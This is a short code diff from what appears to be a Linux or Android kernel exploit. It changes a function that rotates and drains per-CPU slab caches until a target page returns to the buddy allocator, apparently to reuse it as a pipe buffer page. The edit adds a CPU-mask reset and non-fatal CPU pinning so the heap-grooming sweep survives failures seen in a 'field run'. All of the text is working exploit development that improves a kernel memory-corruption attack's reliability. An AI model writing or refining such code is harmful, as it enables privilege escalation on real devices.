@@ -442,12 +442,27 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
    * forces each cpu slab to be drained/rotated until the target page
    * unfreezes back to the buddy (read_target_slab_cache -> 0).
    * clone_child's own pin_to_core(CORE) runs after the alloc, so it does
-   * not undo this. */
+   * not undo this.
+   *
+   * Two guards from the first field run of this rotation: the chain
+   * inherits an affinity narrower than its cpuset (adb shell mask was
+   * 0xcf = cpus 0-3,6,7) so a SYSCHK pin to cpu=4 died with EINVAL ->
+   * exit(255) -> "pipe prepare child DIED status=65280" at wave[4] with
+   * only wave[0..3] logged.  So (1) open the mask back up to the full
+   * cpuset first -- reset_cpu_pin is re-narrowed by the cgroup, never
+   * EINVAL -- and (2) pin non-fatally: an unavailable cpu only warns and
+   * the sweep keeps going on the last good pin. */
   int wave_ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
   if (wave_ncpu < 1)
     wave_ncpu = 1;
+  reset_cpu_pin();
   for (int w = 0; w < CONVERT_MAX_WAVES; w++) {
-    pin_to_core((size_t)(w % wave_ncpu));
+    cpu_set_t wcpu;
+    CPU_ZERO(&wcpu);
+    CPU_SET(w % wave_ncpu, &wcpu);
+    if (sched_setaffinity(0, sizeof(wcpu), &wcpu) != 0)
+      pr_warning("pipe convert wave[%d] pin cpu=%d failed errno=%d; keep last pin\n",
+                 w, w % wave_ncpu, errno);
     tsc = read_target_slab_cache(conv_fd, base);
     if (tsc == 0 && taken_wave >= 0) {
       target_owned = 1;
